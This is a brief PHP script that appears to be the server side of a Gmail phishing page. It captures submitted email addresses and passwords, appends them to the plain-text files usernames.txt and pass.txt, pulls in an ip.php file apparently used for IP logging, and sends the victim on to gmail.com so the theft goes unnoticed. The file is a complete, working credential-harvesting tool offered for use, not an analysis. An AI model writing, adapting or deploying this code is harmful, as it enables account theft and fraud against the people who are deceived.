<?php
include 'ip.php';
file_put_contents("usernames.txt", "Google Useename : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Gmail Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.gmail.com/');
?>
